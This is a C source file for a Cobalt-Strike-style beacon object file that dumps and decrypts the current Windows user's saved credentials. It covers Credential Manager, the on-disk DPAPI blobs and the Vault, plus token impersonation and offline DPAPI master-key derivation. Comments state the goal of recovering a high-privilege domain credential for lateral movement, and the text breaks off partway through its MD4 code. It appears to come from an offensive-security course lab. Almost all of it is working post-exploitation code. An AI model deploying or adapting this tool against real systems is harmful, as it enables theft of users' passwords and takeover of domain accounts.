/*
 * credVault.c — enumerate + DPAPI-decrypt the CURRENT user's Windows Credential
 * Manager entries, on-disk DPAPI credential blobs, AND the modern Vault
 * (vaultcli.dll), IN-PROCESS, as the current user — no admin needed.
 *
 * OSAI M7 (T1555.001 Credential Manager / T1555.005 DPAPI). The user's own DPAPI
 * master key (loaded into their logon session / LSA) decrypts the user's own
 * blobs, so this runs as a plain user beacon. Goal: recover a saved high-priv
 * domain credential (e.g. a saved RDP/WinRM/generic cred for a DC) to auth onward.
 *
 * Path A — ADVAPI32!CredEnumerateW(NULL, CRED_ENUMERATE_ALL_CREDENTIALS): walks the
 *   current user's credman across all logon sessions. For each CREDENTIALW prints
 *   Target/UserName/Type/Persist/LastWritten and decrypts CredentialBlob via
 *   CRYPT32!CryptUnprotectData -> plaintext (hex+ascii + utf16le). NB: a network
 *   logon (WinRM/SMB, type 3) often has NO credman loaded -> CredEnumerate returns
 *   ERROR_NO_SUCH_LOGON_SESSION (1312); that is expected, Paths B/C cover it.
 * Path B — on-disk legacy DPAPI blobs: reads every file in
 *   %LOCALAPPDATA%\Microsoft\Credentials (the at-rest DPAPI blobs) and
 *   CryptUnprotectData's them. Files exist regardless of logon type, and
 *   CryptUnprotectData as the user loads the master key on demand (LSA holds the
 *   user's secret from the network logon) -> works even when credman is not loaded.
 * Path C — modern Vault (vaultcli.dll): VaultEnumerateVaults -> VaultOpenVault ->
 *   VaultEnumerateItems(flag 512) gives plaintext Resource (target) / Identity
 *   (username); VaultGetItem returns the item with the Authenticator DECRYPTED
 *   internally by Windows (as the owning user — no on-disk AES routine needed).
 *   Covers the "Windows Credentials" / "Web Credentials" added via the modern
 *   Credential Manager UI, which live in %LOCALAPPDATA%\Microsoft\Vault (NOT the
 *   legacy Credentials folder) and are invisible to Path B. If the lab's saved
 *   cred was added via the modern UI (typical for saved remote-computer creds),
 *   it is ONLY here.
 *
 *   Win8+ (VAULT_ITEM with pPackageSid) layout is assumed — our targets are all
 *   >= Server 2019 / Win10. Win7 (6-param VaultGetItem, no PackageSid) is NOT
 *   supported by this build.
 *
 * args: optional cstr filter — case-insensitive substring matched against cred
 *   TargetName / blob filename / Vault friendly-name-or-resource. Empty = all.
 *
 * Build: part of AI-BOF (Extension-Kit/AI-BOF), `make` -> _bin/credVault.{x64,x86}.o
 * See LESSONS U2/U4 (no aggregate = {0}; no printf precision), U7 (FILETIME->
 * SYSTEMTIME, no 64-bit div), U1 (no bare libc — use aibof.h helpers), U8
 * (SHGetFolderPathA under SYSTEM returns systemprofile — this BOF relies on a
 * USER-context beacon; under SYSTEM add the ProfileList all-users walk), U11/U12.
 */
#include "aibof.h"
#include <wincred.h>

#ifndef CRED_ENUMERATE_ALL_CREDENTIALS
#define CRED_ENUMERATE_ALL_CREDENTIALS 0x1
#endif
#ifndef CSIDL_LOCAL_APPDATA
#define CSIDL_LOCAL_APPDATA 0x001c
#endif
#ifndef CSIDL_APPDATA
#define CSIDL_APPDATA 0x001a   /* Roaming */
#endif
/* mingw wincred.h only defines CRED_TYPE up to DOMAIN_VISIBLE_PASSWORD(4); add the rest. */
#ifndef CRED_TYPE_GENERIC_CERTIFICATE
#define CRED_TYPE_GENERIC_CERTIFICATE 5
#endif
#ifndef CRED_TYPE_DOMAIN_EXTENDED
#define CRED_TYPE_DOMAIN_EXTENDED 6
#endif

/* SHGetFolderPathA + GetUserNameA are NOT in bofdefs.h — declare locally. */
WINBASEAPI HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND hwndOwner, int nFolder,
                                                   HANDLE hToken, DWORD dwFlags,
                                                   LPSTR pszPath);
WINBASEAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);

/* ---------- vaultcli.dll (Path C) — NOT in bofdefs.h, declare locally ---------- */

typedef HANDLE HVAULT;

typedef struct _VAULT_CAUB { DWORD NumBytes; PBYTE pByteArray; } VAULT_CAUB, *PVAULT_CAUB;

typedef struct _VAULT_VARIANT {
  DWORD Type;        /* VAULT_ELEMENT_TYPE: 7=String, 8=ByteArray, 0xA=ProtectedArray */
  DWORD Unknown;
  union {
    BOOL    Boolean;
    WORD    Short;
    WORD    UnsignedShort;
    DWORD   Int;
    DWORD   UnsignedInt;
    double  Double;
    GUID    Guid;
    LPCWSTR String;
    VAULT_CAUB ByteArray;
    VAULT_CAUB ProtectedArray;
    DWORD   Attribute;
    DWORD   Sid;
  } vv;
} VAULT_VARIANT, *PVAULT_VARIANT;

typedef struct _VAULT_ITEM_ELEMENT {
  DWORD          SchemaElementId;   /* 1=Resource 2=Identity 3=Authenticator 5=PackageSid */
  DWORD          Unknown;
  VAULT_VARIANT  ItemValue;
} VAULT_ITEM_ELEMENT, *PVAULT_ITEM_ELEMENT;

/* Win8+ VAULT_ITEM (adds pPackageSid between pAuthenticatorElement and LastModified).
 * Resource/Identity/Authenticator offsets are identical to the Win7 variant. */
typedef struct _VAULT_ITEM {
  GUID                 SchemaId;
  LPCWSTR              pszCredentialFriendlyName;
  PVAULT_ITEM_ELEMENT  pResourceElement;
  PVAULT_ITEM_ELEMENT  pIdentityElement;
  PVAULT_ITEM_ELEMENT  pAuthenticatorElement;
  PVAULT_ITEM_ELEMENT  pPackageSid;
  FILETIME             LastModified;
  DWORD                dwFlags;
  DWORD                dwPropertiesCount;
  PVAULT_ITEM_ELEMENT  pPropertyElements;
} VAULT_ITEM, *PVAULT_ITEM;

WINBASEAPI DWORD WINAPI VAULTCLI$VaultEnumerateVaults(DWORD dwFlags, DWORD* count, GUID** guids);
WINBASEAPI DWORD WINAPI VAULTCLI$VaultOpenVault(GUID* vaultId, DWORD dwFlags, HVAULT* handle);
WINBASEAPI DWORD WINAPI VAULTCLI$VaultEnumerateItems(HVAULT handle, DWORD dwFlags, DWORD* count, PVOID* items);
WINBASEAPI DWORD WINAPI VAULTCLI$VaultGetItem(HVAULT handle, GUID* schemaId,
                                              PVAULT_ITEM_ELEMENT pResource, PVAULT_ITEM_ELEMENT pIdentity,
                                              PVAULT_ITEM_ELEMENT pPackageSid, HWND hwndOwner, DWORD dwFlags,
                                              PVOID* pItem);
WINBASEAPI DWORD WINAPI VAULTCLI$VaultCloseVault(HVAULT* handle);
WINBASEAPI DWORD WINAPI VAULTCLI$VaultFree(PVOID pMemory);

/* Known vault schema GUIDs (global const aggregates go to .rdata — no memset, see U2). */
static const GUID SCHEMA_WEB_CRED        = {0x3CCD5499,0x87A8,0x4B10,{0xA2,0x15,0x60,0x88,0x88,0xDD,0x3B,0x55}};
static const GUID SCHEMA_WEB_CREDS_VAULT = {0x4BF4C442,0x9B8A,0x41A0,{0xB3,0x80,0xDD,0x4A,0x70,0x4D,0xDB,0x28}};
static const GUID SCHEMA_WIN_CREDS       = {0x77BC582B,0xF0A6,0x4E15,{0x4E,0x80,0x61,0x73,0x6B,0x6F,0x3B,0x29}};
static const GUID SCHEMA_SECURE_NOTE     = {0x2F1A6504,0x0641,0x44CF,{0x8B,0xB5,0x36,0x12,0xD8,0x65,0xF2,0xE5}};
static const GUID SCHEMA_DOMAIN_PASSWORD = {0x3E0E35BE,0x1B77,0x43E7,{0xB8,0x73,0xAE,0xD9,0x01,0xB6,0x27,0x5B}};

/* ---------- small output helpers (no bare libc, no printf width/precision) ---------- */

static char nib(unsigned int v) { return (char)(v < 10 ? '0' + v : 'A' + (v - 10)); }

/* case-insensitive substring (filter match) */
static int ci_substr(const char* h, const char* n) {
  if (!h) return 1;
  if (!n || !*n) return 1;
  int nl = xlen(n);
  for (int i = 0; h[i]; i++) {
    int j = 0;
    for (; j < nl; j++) {
      char a = h[i + j], b = n[j];
      if (a >= 'A' && a <= 'Z') a += 32;
      if (b >= 'A' && b <= 'Z') b += 32;
      if (a != b) break;
    }
    if (j == nl) return 1;
  }
  return 0;
}

static int putu2(char* d, unsigned v) { d[0] = '0' + (v / 10); d[1] = '0' + (v % 10); d[2] = 0; return 2; }
static int putu4(char* d, unsigned v) {
  d[0] = '0' + (v / 1000); d[1] = '0' + ((v / 100) % 10);
  d[2] = '0' + ((v / 10) % 10); d[3] = '0' + (v % 10); d[4] = 0; return 4;
}

/* write n hex digits of v (high nibble first) into d at offset p — no printf width. */
static const char* vaultSchemaName(GUID* g); /* forward decl (defined below) */
static int putHex(char* d, int p, unsigned int v, int n) {
  for (int s = (n - 1) * 4; s >= 0; s -= 4) d[p++] = nib((v >> s) & 0xf);
  return p;
}
static void printGuid(GUID* g) {
  char b[40]; int p = 0;
  p = putHex(b, p, g->Data1, 8); b[p++] = '-';
  p = putHex(b, p, g->Data2, 4); b[p++] = '-';
  p = putHex(b, p, g->Data3, 4); b[p++] = '-';
  p = putHex(b, p, g->Data4[0], 2); p = putHex(b, p, g->Data4[1], 2); b[p++] = '-';
  for (int i = 2; i < 8; i++) p = putHex(b, p, g->Data4[i], 2);
  b[p] = 0;
  BeaconPrintf(CALLBACK_OUTPUT, "  vault GUID: %s (%s)\n", b, vaultSchemaName(g));
}

static const char* credTypeName(DWORD t) {
  switch (t) {
    case CRED_TYPE_GENERIC:               return "Generic";
    case CRED_TYPE_DOMAIN_PASSWORD:       return "DomainPassword";
    case CRED_TYPE_DOMAIN_CERTIFICATE:     return "DomainCertificate";
    case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:return "DomainVisiblePassword";
    case CRED_TYPE_GENERIC_CERTIFICATE:    return "GenericCertificate";
    case CRED_TYPE_DOMAIN_EXTENDED:        return "DomainExtended";
    default: return "Unknown";
  }
}
static const char* credPersistName(DWORD p) {
  switch (p) {
    case CRED_PERSIST_SESSION:      return "Session";
    case CRED_PERSIST_LOCAL_MACHINE: return "LocalMachine";
    case CRED_PERSIST_ENTERPRISE:    return "Enterprise";
    default: return "None";
  }
}
static const char* vaultSchemaName(GUID* g) {
  if (xmemcmp(g, &SCHEMA_WEB_CRED, 16) == 0)        return "WebCredential";
  if (xmemcmp(g, &SCHEMA_WEB_CREDS_VAULT, 16) == 0) return "WebCredentials";
  if (xmemcmp(g, &SCHEMA_WIN_CREDS, 16) == 0)       return "WindowsCredentials";
  if (xmemcmp(g, &SCHEMA_SECURE_NOTE, 16) == 0)     return "SecureNote";
  if (xmemcmp(g, &SCHEMA_DOMAIN_PASSWORD, 16) == 0) return "DomainPassword";
  return "Other";
}

/* print hex+ascii dump of (data,len), capped at cap bytes, in 16-byte rows.
 * each row line built in a small stack buffer -> plain %s (no precision, U4). */
static void printHexAscii(const unsigned char* d, DWORD len, DWORD cap) {
  if (!d || len == 0) { BeaconPrintf(CALLBACK_OUTPUT, "    (empty)\n"); return; }
  if (len > cap) len = cap;
  for (DWORD off = 0; off < len; off += 16) {
    char line[96]; int p = 0;
    DWORD n = (len - off < 16) ? (len - off) : 16;
    for (DWORD k = 0; k < n; k++) {
      unsigned char b = d[off + k];
      line[p++] = nib(b >> 4); line[p++] = nib(b & 0xf); line[p++] = ' ';
    }
    for (DWORD k = n; k < 16; k++) { line[p++] = ' '; line[p++] = ' '; line[p++] = ' '; }
    line[p++] = '|';
    for (DWORD k = 0; k < n; k++) {
      unsigned char b = d[off + k];
      line[p++] = (b >= 32 && b < 127) ? (char)b : '.';
    }
    line[p++] = '|'; line[p++] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "    %s\n", line);
  }
  if (len == cap) BeaconPrintf(CALLBACK_OUTPUT, "    ...(truncated at %lu bytes)...\n", cap);
}

/* interpret bytes as UTF-16LE and print the printable run (password fields are
 * typically UTF-16LE). Heap buffer to keep the frame small. */
static void printUtf16(const unsigned char* d, DWORD len) {
  if (!d || len < 2) return;
  int maxc = (int)(len / 2); if (maxc > 2048) maxc = 2048;
  char* buf = (char*)intAlloc(maxc + 1);
  if (!buf) return;
  int o = 0;
  for (int i = 0; (i + 1) < (int)len && o < maxc; i += 2) {
    unsigned int ch = (unsigned int)d[i] | ((unsigned int)d[i + 1] << 8);
    if (ch == 0) break;
    if (ch >= 32 && ch < 127) buf[o++] = (char)ch;
    else if (ch == 9 || ch == 10 || ch == 13) buf[o++] = ' ';
    else buf[o++] = '.';
  }
  buf[o] = 0;
  if (o >= 2) BeaconPrintf(CALLBACK_OUTPUT, "    [utf16le] %s\n", buf);
  intFree(buf);
}

static void printFileTime(FILETIME* ft) {
  SYSTEMTIME st; xmemset(&st, 0, sizeof(st));
  if (KERNEL32$FileTimeToSystemTime(ft, &st)) {
    char d[24]; int p = 0;
    p += putu4(d + p, st.wYear); d[p++] = '-'; p += putu2(d + p, st.wMonth); d[p++] = '-'; p += putu2(d + p, st.wDay);
    d[p++] = ' '; p += putu2(d + p, st.wHour); d[p++] = ':'; p += putu2(d + p, st.wMinute); d[p++] = ':'; p += putu2(d + p, st.wSecond);
    d[p] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "  Written: %s\n", d);
  }
}

/* try to DPAPI-decrypt (data,len) and print the result; on failure dump the raw
 * bytes so nothing is silently lost (some cred types are not DPAPI-wrapped). */
/* Try CryptUnprotectData on (data+off .. end). On success fills out+desc and
 * returns 1. The CRED wrapper in front of credman on-disk blobs (U16) makes a
 * bare CryptUnprotectData of the whole file return err=13 (INVALID_DATA). */
static int tryUnprotect(const unsigned char* data, DWORD len, DWORD off,
                        DATA_BLOB* out, LPWSTR* desc) {
  if (off >= len) return 0;
  DATA_BLOB in; in.cbData = len - off; in.pbData = (PBYTE)(data + off);
  out->cbData = 0; out->pbData = NULL; *desc = NULL;
  return CRYPT32$CryptUnprotectData(&in, desc, NULL, NULL, NULL, 0, out) ? 1 : 0;
}

static void decryptAndPrint(const char* label, const unsigned char* data, DWORD len) {
  BeaconPrintf(CALLBACK_OUTPUT, "  -- %s (%lu bytes) --\n", label, len);
  if (!data || len == 0) { BeaconPrintf(CALLBACK_OUTPUT, "    (no blob)\n"); return; }
  /* credman on-disk files carry a CRED wrapper (Version,Size,Unk,Type,Guid =
   * 32 bytes on Win10+; some legacy layouts use 12) before the real DPAPI blob.
   * Try the raw blob first, then skip a 12-byte and a 32-byte header. */
  static const DWORD tryOffs[3] = {0, 12, 32};
  DATA_BLOB out; LPWSTR desc = NULL;
  for (int i = 0; i < 3; i++) {
    if (tryUnprotect(data, len, tryOffs[i], &out, &desc)) {
      BeaconPrintf(CALLBACK_OUTPUT, "  [+] DPAPI decrypted OK @+%lu (%lu bytes):\n",
                   tryOffs[i], out.cbData);
      printHexAscii(out.pbData, out.cbData, 1024);
      printUtf16(out.pbData, out.cbData);
      if (out.pbData) KERNEL32$LocalFree(out.pbData);
      if (desc)       KERNEL32$LocalFree(desc);
      return;
    }
  }
  DWORD e = KERNEL32$GetLastError();
  BeaconPrintf(CALLBACK_OUTPUT, "  [-] CryptUnprotectData failed (err=%lu) at all offsets; raw blob:\n", e);
  printHexAscii(data, len, 512);
  printUtf16(data, len);
}

/* print one VAULT_ITEM_ELEMENT (Resource / Identity / Authenticator / PackageSid). */
static void printVaultElement(const char* label, PVAULT_ITEM_ELEMENT e) {
  if (!e) { BeaconPrintf(CALLBACK_OUTPUT, "  %s: <null>\n", label); return; }
  DWORD t = e->ItemValue.Type;
  if (t == 7) { /* String */
    LPCWSTR s = e->ItemValue.vv.String;
    if (s) { char buf[1024]; w2a(s, buf, sizeof(buf)); BeaconPrintf(CALLBACK_OUTPUT, "  %s [str]: %s\n", label, buf); }
    else   { BeaconPrintf(CALLBACK_OUTPUT, "  %s [str]: <null>\n", label); }
  } else if (t == 8 || t == 0xA) { /* ByteArray / ProtectedArray */
    VAULT_CAUB* b = (t == 8) ? &e->ItemValue.vv.ByteArray : &e->ItemValue.vv.ProtectedArray;
    BeaconPrintf(CALLBACK_OUTPUT, "  %s [bytes/%lu]:\n", label, b->NumBytes);
    printHexAscii(b->pByteArray, b->NumBytes, 1024);
    printUtf16(b->pByteArray, b->NumBytes);
  } else {
    BeaconPrintf(CALLBACK_OUTPUT, "  %s [type=%lu]\n", label, t);
  }
}

/* ---------- Path A: CredEnumerate (current user credman) ---------- */
static void dumpCredman(const char* filter) {
  DWORD count = 0; PCREDENTIALW* creds = NULL;
  if (!ADVAPI32$CredEnumerateW(NULL, CRED_ENUMERATE_ALL_CREDENTIALS, &count, &creds)) {
    DWORD e = KERNEL32$GetLastError();
    BeaconPrintf(CALLBACK_ERROR,
      "[-] CredEnumerateW failed (err=%lu). credman vault not loaded in this logon\n"
      "    session (typical for a network/WinRM logon, type 3). Try Path B / Path C below.\n", e);
    return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[+] CredEnumerate: %lu entr%s\n", count, count == 1 ? "y" : "ies");
  for (DWORD i = 0; i < count; i++) {
    PCREDENTIALW c = creds[i];
    char tgt[512]; w2a(c->TargetName, tgt, sizeof(tgt));
    if (filter && filter[0] && !ci_substr(tgt, filter)) continue;
    char usr[256]; w2a(c->UserName, usr, sizeof(usr));
    BeaconPrintf(CALLBACK_OUTPUT, "--- cred[%lu] ---\n", i);
    BeaconPrintf(CALLBACK_OUTPUT, "  Target : %s\n", tgt);
    BeaconPrintf(CALLBACK_OUTPUT, "  User   : %s\n", usr);
    BeaconPrintf(CALLBACK_OUTPUT, "  Type   : %lu (%s)\n", c->Type, credTypeName(c->Type));
    BeaconPrintf(CALLBACK_OUTPUT, "  Persist: %lu (%s)\n", c->Persist, credPersistName(c->Persist));
    printFileTime(&c->LastWritten);
    decryptAndPrint("CredentialBlob", c->CredentialBlob, c->CredentialBlobSize);
  }
  ADVAPI32$CredFree(creds);
}

/* ---------- Path B: on-disk legacy DPAPI blobs ----------
 * Persisted Credential Manager blobs live under BOTH:
 *   %LOCALAPPDATA%\Microsoft\Credentials   (CSIDL_LOCAL_APPDATA, 0x1c)
 *   %APPDATA%\Microsoft\Credentials        (CSIDL_APPDATA / Roaming, 0x1a)
 * Lab creds are frequently in the ROAMING folder (empty Local is a false
 * negative — U16).  Walk both. */
static int appends(char* d, int p, int cap, const char* s) {
  for (int i = 0; s && s[i] && p < cap; i++) d[p++] = s[i];
  return p;
}

/* Walk <base>\Microsoft\Credentials\* and DPAPI-decrypt every file. Returns
 * the number of files processed. */
static int dumpOnDiskDir(const char* base, const char* filter) {
  char dir[600]; int p = 0;
  p = appends(dir, p, sizeof(dir) - 2, base);
  p = appends(dir, p, sizeof(dir) - 2, "\\Microsoft\\Credentials\\*");
  dir[p] = 0;

  WIN32_FIND_DATAA fd; xmemset(&fd, 0, sizeof(fd));
  HANDLE h = KERNEL32$FindFirstFileA(dir, &fd);
  if (h == INVALID_HANDLE_VALUE) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] %s\\Microsoft\\Credentials  (absent/empty)\n", base);
    return 0;
  }
  int n = 0;
  do {
    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
    if (filter && filter[0] && !ci_substr(fd.cFileName, filter)) continue;
    char path[600]; int q = 0;
    q = appends(path, q, sizeof(path) - 2, base);
    q = appends(path, q, sizeof(path) - 2, "\\Microsoft\\Credentials\\");
    q = appends(path, q, sizeof(path) - 2, fd.cFileName);
    path[q] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "--- on-disk blob: %s (%lu bytes) ---\n", fd.cFileName, fd.nFileSizeLow);
    unsigned char* buf = NULL; DWORD got = 0;
    if (read_file(path, &buf, &got, 131072)) {
      decryptAndPrint(fd.cFileName, buf, got);
      intFree(buf);
    } else {
      BeaconPrintf(CALLBACK_ERROR, "    (unreadable) %s\n", path);
    }
    n++;
  } while (KERNEL32$FindNextFileA(h, &fd));
  KERNEL32$FindClose(h);
  return n;
}

static void dumpOnDisk(const char* filter) {
  char local[260], roam[260];
  HRESULT hrL = SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local);
  HRESULT hrR = SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roam);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] LOCALAPPDATA = %s  |  APPDATA(Roaming) = %s\n",
               (hrL == 0 ? local : "(err)"), (hrR == 0 ? roam : "(err)"));
  int total = 0;
  if (hrL == 0) total += dumpOnDiskDir(local, filter);
  if (hrR == 0) total += dumpOnDiskDir(roam, filter);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] on-disk Credentials: %d file(s) processed\n", total);
}

/* ---------- Path C: modern Vault via vaultcli.dll ---------- */
static void dumpVault(const char* filter) {
  DWORD vaultCount = 0; GUID* vaultGuids = NULL;
  DWORD r = VAULTCLI$VaultEnumerateVaults(0, &vaultCount, &vaultGuids);
  if (r != 0 || vaultCount == 0 || !vaultGuids) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] VaultEnumerateVaults: %lu vault(s) (err=%lu)\n", vaultCount, r);
    if (vaultGuids) VAULTCLI$VaultFree(vaultGuids);
    return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[+] %lu vault(s)\n", vaultCount);
  for (DWORD v = 0; v < vaultCount; v++) {
    GUID* vg = &vaultGuids[v];
    BeaconPrintf(CALLBACK_OUTPUT, "--- vault[%lu] ---\n", v);
    printGuid(vg);
    HVAULT vh = NULL;
    DWORD orr = VAULTCLI$VaultOpenVault(vg, 0, &vh);
    if (orr != 0 || !vh) { BeaconPrintf(CALLBACK_OUTPUT, "  VaultOpenVault err=%lu\n", orr); continue; }
    DWORD itemCount = 0; PVOID items = NULL;
    DWORD er = VAULTCLI$VaultEnumerateItems(vh, 512, &itemCount, &items);
    if (er != 0 || !items) {
      BeaconPrintf(CALLBACK_OUTPUT, "  VaultEnumerateItems err=%lu (count=%lu)\n", er, itemCount);
      if (items) VAULTCLI$VaultFree(items);
      HVAULT vh2 = vh; VAULTCLI$VaultCloseVault(&vh2);
      continue;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "  %lu item(s)\n", itemCount);
    if (itemCount == 0) {
      VAULTCLI$VaultFree(items);
      HVAULT vh2 = vh; VAULTCLI$VaultCloseVault(&vh2);
      continue;
    }
    VAULT_ITEM* arr = (VAULT_ITEM*)items;
    for (DWORD i = 0; i < itemCount; i++) {
      VAULT_ITEM* it = &arr[i];
      char fn[512];   fn[0] = 0; if (it->pszCredentialFriendlyName) w2a(it->pszCredentialFriendlyName, fn, sizeof(fn));
      char rbuf[1024]; rbuf[0] = 0;
      if (it->pResourceElement && it->pResourceElement->ItemValue.Type == 7 && it->pResourceElement->ItemValue.vv.String)
        w2a(it->pResourceElement->ItemValue.vv.String, rbuf, sizeof(rbuf));
      if (filter && filter[0] && !ci_substr(fn, filter) && !ci_substr(rbuf, filter)) continue;
      BeaconPrintf(CALLBACK_OUTPUT, "--- vault[%lu] item[%lu] schema=%s ---\n", v, i, vaultSchemaName(&it->SchemaId));
      if (fn[0])   BeaconPrintf(CALLBACK_OUTPUT, "  Name: %s\n", fn);
      printVaultElement("Resource", it->pResourceElement);
      printVaultElement("Identity", it->pIdentityElement);
      /* VaultGetItem returns the item with the Authenticator DECRYPTED (as the user). */
      PVOID pItem = NULL;
      DWORD gr = VAULTCLI$VaultGetItem(vh, &it->SchemaId, it->pResourceElement,
                                       it->pIdentityElement, it->pPackageSid, NULL, 0, &pItem);
      if (gr == 0 && pItem) {
        VAULT_ITEM* di = (VAULT_ITEM*)pItem;
        printVaultElement("Authenticator", di->pAuthenticatorElement);
        VAULTCLI$VaultFree(pItem);
      } else {
        BeaconPrintf(CALLBACK_OUTPUT, "  Authenticator: VaultGetItem err=%lu (DPAPI master key not loaded?)\n", gr);
      }
      printVaultElement("PackageSid", it->pPackageSid);
    }
    VAULTCLI$VaultFree(items);
    HVAULT vh3 = vh; VAULTCLI$VaultCloseVault(&vh3);
  }
  VAULTCLI$VaultFree(vaultGuids);
}

/* Optional -u/-p/-d: LogonUser an INTERACTIVE (type 2) token and impersonate it.
 * The beacon normally runs under a network (type 3) logon -> no credman loaded
 * (CredEnumerate ERROR_NO_SUCH_LOGON_SESSION 1312) and vaultcli refuses (delegation
 * error 0x80090345). An interactive logon session loads the user's credential store
 * + materializes DPAPI (master key from the user's profile), so the three dump paths
 * then operate against the right (loaded) credman/vault + can CryptUnprotectData the
 * user's own blobs. Returns the token handle (Close + RevertToSelf after) or NULL on
 * failure, in which case the caller falls back to the beacon's own context. */
/* allow -u to carry the domain itself: "DOMAIN\user" or "user@DOMAIN" -> split,
 * so -d is optional (and one fewer flag to mistype). Mutates u in place. */
static void parseUserDomain(char* u, const char** outUser, const char** outDomain) {
  *outUser = u; *outDomain = NULL;
  if (!u || !*u) return;
  for (int i = 0; u[i]; i++) {
    if (u[i] == '\\') { u[i] = 0; *outDomain = u; *outUser = u + i + 1; return; }
  }
  for (int i = 0; u[i]; i++) {
    if (u[i] == '@') { u[i] = 0; *outUser = u; *outDomain = u + i + 1; return; }
  }
}

static HANDLE spawnImpersonationToken(const char* user, const char* domain, const char* pass) {
  HANDLE hTok = NULL;
  if (!ADVAPI32$LogonUserA(user, (domain && domain[0]) ? domain : NULL, pass,
                           LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hTok)) {
    DWORD e = KERNEL32$GetLastError();
    BeaconPrintf(CALLBACK_ERROR, "[-] LogonUserA(%s\\%s, INTERACTIVE) failed err=%lu — falling back to beacon context\n",
                 (domain && domain[0]) ? domain : ".", user ? user : "", e);
    return NULL;
  }
  if (!ADVAPI32$ImpersonateLoggedOnUser(hTok)) {
    DWORD e = KERNEL32$GetLastError();
    BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser failed err=%lu — falling back to beacon context\n", e);
    KERNEL32$CloseHandle(hTok);
    return NULL;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[+] impersonating %s\\%s (interactive logon token; credman/vault/DPAPI now loaded)\n",
               (domain && domain[0]) ? domain : ".", user ? user : "");
  return hTok;
}

/* ===================== Path D: offline DPAPI decryption =====================
 * On-box CryptUnprotectData returns err=13 on credman blobs because the master
 * key is NOT unlocked in a LogonUser-created session (only a real desktop logon
 * pre-loads DPAPI master keys). So we decrypt the blob ourselves from the user's
 * password + SID + the on-disk master key file — no LSASS, no SYSTEM. Algorithm
 * ported from impacket dpapi (deriveKeysFromUser / MasterKey.decrypt /
 * DPAPI_Blob.decrypt). Route that works for a domain user with a known password:
 * key2 = HMAC-SHA1(MD4(UTF16LE(pw)), UTF16LE(SID+"\0")); key1 (SHA1 route) tried as
 * fallback; the correct key is confirmed by the master-key HMAC. Validated on
 * jordan.west's box (U18): recovers TERMSRV/DC01 -> MEGACORPONE\Administrator. */

/* Crypto via CNG (BCrypt). We originally used legacy CryptoAPI (advapi32), but
 * on Win11/Server 2025 the PROV_RSA_AES provider silently mis-computes HMAC
 * over SHA256/SHA512 (key3 came back as uninitialized garbage), so every
 * password->key derivation was wrong. CNG (bcrypt) is the modern API and
 * reliably supports SHA1/SHA256/SHA512 HMAC + AES-256-CBC; bofdefs.h already
 * declares the BCrypt* imports (and #includes <bcrypt.h>). MD4 is hand-rolled
 * (CNG also lacks MD4). CALG_* constants below are kept ONLY as identifiers that
 * algName() maps to CNG algorithm-name strings. */
#ifndef CALG_MD4
#define CALG_MD4 0x8002
#endif
#ifndef CALG_SHA1
#define CALG_SHA1 0x8004
#endif
#ifndef CALG_SHA_512
#define CALG_SHA_512 0x800e
#endif
#ifndef CALG_SHA_256
#define CALG_SHA_256 0x800c
#endif
#ifndef CALG_AES_256
#define CALG_AES_256 0x6610
#endif
#ifndef BCRYPT_ALG_HANDLE_HMAC_FLAG
#define BCRYPT_ALG_HANDLE_HMAC_FLAG 0x00000008
#endif
#ifndef BCRYPT_BLOCK_PADDING
#define BCRYPT_BLOCK_PADDING 1
#endif

static char nibL(unsigned int v) { return (char)(v < 10 ? '0' + v : 'a' + (v - 10)); }

/* ---- MD4 (RFC 1320), hand-implemented ----
 * CryptoAPI's CALG_MD4 is NOT reliably served by PROV_RSA_AES on Win11/Server 2025
 * (CryptCreateHash silently fails -> zero digest -> wrong NTLM hash -> wrong key3).
 * The DPAPI Protected-Users route needs MD4(UTF16LE(pw)) = the NTLM hash, so we
 * compute it ourselves. Validated against hashlib/PyCryptodome: MD4("...UTF16LE")
 * matches. No libc: manual loops, explicit stores, xmemcpy/xmemset only. */
#define MD4_F(x,y,z) (((x)&(y))|(~(x)&(z)))
#define MD4_G(x,y,z) (((x)&(y))|((x)&(z))|((y)&(z)))
#define MD4_H(x,y,z) ((x)^(y)^(z))
#define MD4_LS(x,s)  (((x)<<(s))|((x)>>(32-(s))))
#define MD4_R1(a,b,c,d,k,s) (a)=MD4_LS((a)+MD4_F((b),(c),(d))+X[k],s)
#define MD4_R2(a,b,c,d,k,s) (a)=MD4_LS((a)+MD4_G((b),(c),(d))+X[k]+0x5a827999,s)
#define MD4_R3(a,b,c,d,k,s) (a)=MD4_LS((a)+MD4_H((b),(c),(d))+X[k]+0x6ed9eba1,s)
static void md4_body(unsigned int* S, const unsigned char* data) {
  unsigned int X[16], i;
  for (i = 0; i < 16; i++) X[i] = (unsigned int)data[i*4] | ((unsigned int)data[i*4+1] << 8) | ((unsigned int)data[i*4+2] << 16) | ((unsigned int)data[i*4+3] << 24);
  unsigned int A = S[0], B = S[1], C = S[2], D = S[3];
  MD4_R1(A,B,C,D,0,3);  MD4_R1(D,A,B,C,1,7);  MD4_R1(C,D,A,B,2,11); MD4_R1(B,C,D,A,3,19);
  MD4_R1(A,B,C,D,4,3);  MD4_R1(D,A,B,C,5,7);  MD4_R1(C,D,A,B,6,11); MD4_R1(B,C,D,A,7,19);
  MD4_R1(A,B,C,D,8,3);  MD4_R1(D,A,B,C,9,7);  MD4_R1(C,D,A,B,10,11);MD4_R1(B,C,D,A,11,19);
  MD4_R1(A,B,C,D,12,3); MD4_R1(D,A,B,C,13,7); MD4_R1(C,D,A,B,14,11);MD4_R1(B,C,D,A,15,19);
